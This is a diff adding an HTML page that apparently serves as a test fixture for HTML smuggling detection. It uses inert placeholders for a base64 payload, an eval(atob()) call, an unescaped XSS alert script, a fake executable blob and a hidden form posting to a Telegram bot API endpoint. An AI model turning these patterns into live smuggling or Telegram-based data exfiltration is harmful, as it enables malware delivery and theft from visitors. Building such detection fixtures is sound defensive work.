@@ -1,0 +1,15 @@
+<html>
+<head><title>Secure Document Download</title></head>
+<body>
+<script>
+  let b64_payload = "SGVsbG9Xb3JsZEhUTUxTbXVnZ2xpbmdQYXlsb2FkVGVzdEZvckJhc2U2NERlY29kaW5nSW5IVE1MRmlsZXNGb3JGb3JlbnNpY3NUcmlhZ2VMFiA==";
+  eval(atob("Y29uc29sZS5sb2coJ0V2YWwgRGVjb2RlZCcp"));
+  let unescaped = unescape("%3Cscript%3Ealert('XSS')%3C/script%3E");
+  let blob = new Blob(["Simulated Malicious Executable Bytes"], {type: 'application/octet-stream'});
+  let downloadUrl = URL.createObjectURL(blob);
+</script>
+<form action="https://api.telegram.org/bot987654321:AAFxz_test/sendMessage" method="POST">
+  <input type="hidden" name="chat_id" value="12345678">
+</form>
+</body>
+</html>
